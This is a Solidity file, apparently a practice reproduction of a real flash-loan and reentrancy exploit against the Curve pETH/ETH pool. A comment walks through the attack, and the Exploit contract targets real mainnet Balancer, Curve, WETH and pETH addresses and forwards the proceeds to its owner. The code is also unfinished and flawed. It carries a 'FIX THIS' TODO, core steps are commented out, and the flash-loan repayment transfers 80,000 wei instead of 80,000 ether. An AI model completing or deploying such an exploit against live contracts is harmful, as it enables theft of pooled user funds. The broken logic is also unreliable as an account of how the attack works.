// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/Test.sol";

/*
1. The exploiter opened an 80,000 WETH flash loan from Balancer and unwrapped all to ETH.

2. They provided 40,000 ETH as liquidity to the Curve pETH/ETH pool and received 32,431.41 pETH-ETH LP tokens.

3. 3,740 pETH and 34,316 ETH was removed from the pool by burning 32,431.41 pETH/ETH pool LP tokens.

4. They again provided 40,000 ETH as liquidity to the Curve pETH/ETH pool, minting 82,182 more LP tokens.

5. Another 1,184.73 pETH and 47,506.53 ETH was withdrawn by burning 10,272.84 Curve LP tokens.

6. 4,924 pETH was swapped for 4,285 ETH within the Curve pool.

7. 86,106.65 ETH was wrapped to WETH.

8. 80,000 WETH repaid to Balancer to return the flash loan.

9. 6,106.65 WETH ~$11 million was retained as profit.

https://ethtx.info/mainnet/0xa84aa065ce61dbb1eb50ab6ae67fc31a9da50dd2c74eefd561661bfce2f1620c/
*/

interface IFlashLoanRecipient {
    function makeFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external;
}

interface IVault {
    function flashLoan(IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface ICurvePool {
    function balanceOf(address account) external view returns (uint256);
    function add_liquidity(uint256[2] calldata _amounts, uint256 _min_mint_amount, address) external payable returns (uint256);
    function remove_liquidity(uint256 _burn_amount, uint256[2] calldata _min_amounts, address) external returns (uint256[] memory);
    function exchange(int128 i, int128 j, uint256 dx, uint256 _min_dy, address) external payable returns (uint256);
}

interface IWETH {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}


contract Exploit is IFlashLoanRecipient {
    error NOT_OWNER();
    error NOT_VAULT();

    ICurvePool public constant peth_eth_pool = ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IVault public constant balancerVault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH public constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant peth = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    address public immutable owner;

    uint256 public executionCount;

    constructor (address owner_) {
        owner = owner_;
    }

    modifier onlyOwner {
        if (msg.sender != owner) {
            revert NOT_OWNER();
        }
        _;
    }

    fallback() external payable {
        // TODO: FIX THIS FALLBACK FUNCTION!!!!
        ++executionCount;
        if (executionCount == 0 || executionCount == 1) {
            // Add liquidity to curve pool
            uint256[2] memory _amounts;
            _amounts[0] = 40000000000000000000000;
            _amounts[1] = 0;
            uint256 mintAmount = peth_eth_pool.add_liquidity{value: 40000000000000000000000}(_amounts, 0, address(this));

            // remove liquidity

            // remove liquidity gives u eth and it will trigger the fallback again
            // we need an execution counter which allows fallback to call the right functions
            // uint256[2] memory _min_amounts;
            // _min_amounts[0] = 0;
            // _min_amounts[1] = 0;
            // uint256 peth_eth_balance = peth_eth_pool.balanceOf(address(this));
            // peth_eth_pool.remove_liquidity(peth_eth_balance, _min_amounts, address(this));

        }

        if (executionCount == 2) {
            // Swap for eth
            uint256 pethBalance = peth.balanceOf(address(this));

            peth_eth_pool.exchange(1, 0, pethBalance, pethBalance - 1000000000000000000000, address(this));

        }

        if (executionCount == 3) {
            // deposit eth for weth
            weth.deposit{value: 80000 ether}();

            weth.transfer(address(balancerVault), 80000);

            // Transfer eth to owner
            (bool sent, ) = owner.call{value: address(this).balance}("");
            require(sent);
            return;
        }
    }

    function makeFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) public override onlyOwner {
        balancerVault.flashLoan(IFlashLoanRecipient(this), tokens, amounts, userData);
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) public override {
        if (msg.sender != address(balancerVault)) {
            revert NOT_VAULT();
        }

        // require(weth.balanceOf(address(this)) == 80000 ether, "We don't have the eth we want");

        // Withdraw ETH from WETH
        weth.withdraw(80000 ether);

        console2.log(executionCount);

    }

    // function continueExploit() public {
        // require(address(this).balance >= 80000 ether, "Not enough eth to rug");
        // require(block.number == 17806054, "wrong block number");

    // }
}
